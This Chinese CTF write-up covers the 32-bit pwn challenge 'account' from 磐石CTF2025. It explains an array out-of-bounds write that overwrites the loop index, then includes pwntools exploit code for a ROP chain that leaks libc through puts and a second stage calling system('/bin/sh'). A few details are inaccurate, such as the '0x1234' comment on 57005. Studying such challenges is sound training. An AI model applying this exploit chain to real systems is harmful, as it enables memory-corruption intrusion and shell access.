---
title: 磐石CTF2025 Pwn赛题account详解：32位环境下的数组越界与ROP实战
contest: 磐石CTF2025
year: 2025
difficulty: easy
vuln_type: ret2libc
tags: [32位ROP, 数组越界, 栈溢出, vuln()循环, v1[v2++]覆盖返回地址, ret2libc, puts泄漏libc]
attack_chain: vuln()读4字节入v0→v1[v2++]=v0循环10次填满v1→overwrite v1[10]=13改idx→v1[14]=ret_addr→ROP1:puts(puts@got)→libc_base→ROP2:system(/bin/sh)
key_payload: "v1[v2++]=v0;v1[10]=v2 idx;v1[14]=ret_addr;main=0x8049264;pop_ebx_ret=0x08049022;puts@got泄libc_base=puts-0x6d1e0;system(/bin/sh)"
one_liner: 磐石CTF2025 account：32位v1数组越界+循环10次+v2覆盖+两次ROP（泄libc+ret2libc）
lesson: 循环写入数组时v2 idx也可被覆盖，构造精确索引可写任意栈位置
quality: high
---

# 磐石CTF2025 Pwn赛题account详解：32位环境下的数组越界与ROP实战

**赛事**：磐石CTF2025 - account

**难度**：121人解题

**知识点**：数组越界访问 + 栈溢出 + 32位ROP

**逆向分析**：
- 只有一个vuln()函数
- 输入数据存储到v0变量
- v0[0]被识别为后续数组的一部分（识别错误）
- IDA修复：把v0类型改成非数组

**漏洞分析**：
- vuln()循环读取4字节输入
- 修改 v1[v2++] = v0
- v2从0逐渐增加，覆盖栈高地址
- 覆盖 old_rbp、ret_addr
- 写入ROP

**关键细节**：
- v1[10]是变量v2（数组当前循环下标）
- 写入合法值才能继续
- **覆盖v2为13**：下次循环修改v1[14]，即存储返回地址位置

**ROP第一阶段：泄露libc**
```python
# 写满v1数组
for i in range(10):
    p.sendline(b'57005')  # 0x1234
    sleep(0.2)

# overwrite idx -> 13
p.sendline(b'13')
sleep(0.2)

# ROP1: puts(puts@got) -> 返回main
main = 0x8049264
pop_ebx_ret = 0x08049022

p.sendline(str(elf.plt['puts']).encode())  # puts的plt地址
p.sendline(str(pop_ebx_ret).encode())      # pop ebx; ret
p.sendline(str(elf.got['puts']).encode())  # puts的got地址(传给ebx)
p.sendline(str(main).encode())             # 返回main重新开始

p.sendline(b'0')
p.recvuntil(b'Recording completed\n')
libc_base = u32(p.recvuntil(b'\xf7')[-4:].ljust(4, b'\x00')) - 0x6d1e0
libc.address = libc_base
```

**ROP第二阶段：ret2libc**
- 同样写满+改idx=13
- 调用 system("/bin/sh")

**关键技术**：
- 数组越界 + 循环idx可覆盖
- 两次ROP（泄libc + ret2libc）
- 32位无PIE程序（地址固定）
- puts函数泄got → 计算libc_base

**质量评估**：高（完整EXP + 详细注释）
